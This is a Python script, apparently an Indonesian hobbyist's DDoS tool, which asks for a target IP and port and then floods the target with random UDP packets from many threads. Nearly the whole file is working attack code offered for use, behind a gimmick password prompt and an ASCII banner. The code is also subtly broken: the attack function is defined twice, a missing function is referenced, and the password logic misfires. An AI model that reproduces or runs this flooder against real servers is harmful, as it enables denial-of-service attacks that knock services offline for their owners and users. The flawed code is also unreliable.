import random
import socket
import threading
import os,sys
import time

password = input("[•] Account :")
time.sleep(2)
if password=="XXBR":
  print("[✓] Akun  Berhasil Masuk")
  time.sleep(2)
  os.system("clear")
  print("\033[1;34;40m=>Build By ZXZ<=")
  time.sleep(1)
  print("\033[1;34;40m=>YT XXBR<= ")
  time.sleep(1)
  print("\033[1;34;40m=>JANGAN BUAT ABUSE KONTOL<=")
  time.sleep(3)
os.system('clear')
print("""
\033[1;35;40m
███████╗██╗░░██╗███████╗
╚════██║╚██╗██╔╝╚════██║
░░███╔═╝░╚███╔╝░░░███╔═╝
██╔══╝░░░██╔██╗░██╔══╝░░
███████╗██╔╝╚██╗███████╗
╚══════╝╚═╝░░╚═╝╚══════╝

██████╗░░█████╗░██╗░░██╗███████╗████████╗
██╔══██╗██╔══██╗██║░██╔╝██╔════╝╚══██╔══╝
██████╔╝███████║█████═╝░█████╗░░░░░██║░░░
██╔═══╝░██╔══██║██╔═██╗░██╔══╝░░░░░██║░░░
██║░░░░░██║░░██║██║░╚██╗███████╗░░░██║░░░
╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝░░░╚═╝░░░
                                               
         >>>  WELCOME TO MY TOOLS
         >>>  Kalau Nge Ddos Jangan Abuse
         >>>  Build By ZXZ
         >>   MY YOUTUBE : XXBR\033[1;34;40m
""")

ip = str(input("\033[1;34;40mIp Server : "))
port = int(input("Port Server : "))
times = int(input("Packets  : "))
threads = int(input("Barang : "))

# Attack
def xxbr():
	data = random._urandom(1024)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(f"Alamat server Ip\033[1;37;40m{ip}:{port} \033[1;34;40m<=>Paket sedang menuju alamat tujuan")
		except:
			print(f"Alamat server Ip\033[1;37;40m{ip}:{port} \033[1;34;40m<=>Paket sedang menuju alamat tujuan")

#ATTACK2
def xxbr():
	data = random._urandom(16)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(f"Alamat server Ip\033[1;37;40m{ip}:{port} \033[1;34;40m<=>Paket sedang menuju alamat tujuan")
		except:
			print(f"Alamat server Ip\033[1;37;40m{ip}:{port} \033[1;34;40m<=>Paket sedang menuju alamat tujuan")


# Threads
for y in range(threads):
	th = threading.Thread(target = xxbr)
	th.start()
else:
		th = threading.Thread(target = xxbr2)
		th.start()
		print("\033[1;31;40m[!] Wrong Password!")
